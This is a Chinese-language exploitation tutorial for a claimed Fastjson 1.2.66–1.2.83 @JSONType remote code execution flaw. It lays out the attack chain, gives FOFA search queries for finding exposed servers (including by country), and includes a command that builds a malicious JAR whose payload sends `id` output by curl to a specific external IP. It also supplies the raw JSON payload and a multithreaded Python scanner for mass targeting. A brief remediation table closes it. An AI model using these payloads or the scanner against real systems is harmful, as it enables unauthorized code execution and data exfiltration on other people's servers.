# Fastjson 1.2.66~1.2.83 @JSONType RCE 复现教程

## 漏洞信息

| 项目 | 内容 |
|:---|:---|
| **漏洞名** | Fastjson @JSONType 注解探测路径远程代码执行漏洞 |
| **产品** | Alibaba Fastjson |
| **类型** | RCE（远程代码执行） |
| **影响版本** | Fastjson 1.2.66 ~ 1.2.83 |
| **公开时间** | 2026-07-20 |
| **PoC状态** | 有公开PoC |

## 漏洞原理

Fastjson 1.2.83 的 `checkAutoType()` 中存在 `@JSONType` 注解探测路径。`typeName.replace('.','/') + ".class"` 构造的资源路径经由 `LaunchedURLClassLoader.getResourceAsStream()` 获取时，若远程类文件包含 `@JSONType` 注解，Fastjson 会信任该类并绕过 `autoType` 限制，最终加载恶意类执行 `<clinit>` 中的代码。

**关键条件：** Spring Boot FatJar + JDK 8 + 出网 + safeMode未开启

## 利用链

```
Step 1 ── 构造 @type 值: jar:http:..{IP_INT}:{PORT}.probe!.POC
Step 2 ── Fastjson replace('.','/'): jar:http://IP:PORT/probe!/POC.class
Step 3 ── LaunchedURLClassLoader.getResourceAsStream() 下载 JAR
Step 4 ── Fastjson 检测 @JSONType 注解 → 绕过 autoType
Step 5 ── defineClass() → <clinit> → Runtime.exec() → RCE
```

## 复现步骤

### 第一步：搜索资产

```bash
# FOFA
body="fastjson" && port="8080"
body="fastjson" && country="SG"
header="X-Fastjson-Version"
```

### 第二步：环境搭建

```bash
# 1. 下载JDK 8、asm-9.6.jar、fastjson-1.2.83.jar

# 2. 编译恶意类生成器
javac -encoding utf-8 -cp "asm-9.6.jar;fastjson-1.2.83.jar" -d . GenProbe.java

# 3. 生成恶意probe.jar（ip到整数: 141.11.2.101→2366308965）
java -cp ".;asm-9.6.jar;fastjson-1.2.83.jar" GenProbe 141.11.2.101 80 \
  "curl http://141.11.2.101:80/id-\$(id|sed 's/ /_/g')"

# 4. 启动HTTP服务
python3 -m http.server 80
```

### 第三步：检测漏洞

```bash
python3 exp.py -u http://target:8080/parse -poc http://141.11.2.101:80/probe
```

手动请求：
```
POST /api/parse HTTP/1.1
Content-Type: application/json

{"@type":"jar:http:..2366308965:80.probe!.POC","x":1}
```

**SSRF成功：** HTTP日志出现 `GET /probe from TARGET`
**RCE成功：** HTTP日志出现 `GET /id-xxx from TARGET`

## 成功标志

| 标志 | 含义 |
|:---|:---|
| HTTP服务器收到 `GET /probe` | SSRF（JAR下载成功） |
| HTTP服务器收到 `GET /id-xxx` | **RCE（命令执行成功）** |
| 请求超时 + HTTP回调 | RCE可能已触发 |
| 响应包含 `"status":"ok"` | 类加载成功 |

## 批量检测脚本

```python
#!/usr/bin/env python3
"""
Fastjson 1.2.83 @JSONType RCE 批量检测+利用脚本
用法:
    python3 scanner.py -u http://target:8080
    python3 scanner.py -f targets.txt
"""
import requests, sys, urllib3, argparse, concurrent.futures, struct, socket, time
urllib3.disable_warnings()

ENDPOINTS = ["/", "/api/parse", "/api/parseObject", "/parse", "/login", "/submit"]

def ip_to_int(ip):
    return struct.unpack("!I", socket.inet_aton(ip))[0]

def check_target(url, cb_host, cb_port):
    base = url.rstrip("/")
    ip_int = ip_to_int(cb_host)
    payload = '{"@type":"jar:http:..%d:%d.probe!.POC","x":1}' % (ip_int, int(cb_port))
    headers = {"Content-Type": "application/json"}

    for ep in ENDPOINTS:
        try:
            r = requests.post(base + ep, data=payload, headers=headers, timeout=8)
            if r.status_code != 404:
                if "autoType is not support" in r.text:
                    return (url, "SSRF(autoType)")
                return (url, "SSRF+")
        except requests.exceptions.Timeout:
            return (url, "TIMEOUT")
        except:
            pass
    return (url, "SAFE")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url")
    parser.add_argument("-f", "--file")
    parser.add_argument("--cb", default="141.11.2.101:80")
    args = parser.parse_args()

    targets = [args.url] if args.url else [l.strip() for l in open(args.file) if l.strip()]
    cb = args.cb.split(":")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        fut_map = {ex.submit(check_target, t, cb[0], cb[1]): t for t in targets}
        for fut in concurrent.futures.as_completed(fut_map):
            url, status = fut.result()
            print("[%s] %s" % (status, url))

if __name__ == "__main__":
    main()
```

## FOFA搜索语法

```
body="fastjson" && port="8080"
header="X-Fastjson-Version"
body="fastjson" && country="SG"
body="LaunchedURLClassLoader"
```

## 修复建议

| 措施 | 说明 |
|:---|:---|
| 开启SafeMode | `-Dfastjson.parser.safeMode=true` |
| 升级Fastjson2 | 彻底重构 |
| 出口管控 | 阻止应用对外HTTP |
| JDK 9+ | 阻断defineClass |
| WAF规则 | 拦截`@type":"jar:http:` |

## 参考链接

- https://github.com/0x7eTeam/fastjson-1.2.83-rce
- https://github.com/Blushl/redteam-notes
